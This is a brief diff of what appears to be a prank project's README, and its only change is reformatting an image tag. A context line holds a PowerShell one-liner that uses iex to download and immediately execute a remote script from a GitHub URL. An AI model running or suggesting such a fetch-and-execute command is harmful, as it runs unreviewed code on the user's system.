@@ -5,4 +5,6 @@ iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercon
 ```
 
 Also, you're fired!\
-![alt text](https://github.com/Refr3sh/YWTTC/raw/main/download.jpg)
+<p align="center">
+  <img src="https://github.com/Refr3sh/YWTTC/raw/main/download.jpg" />
+</p>
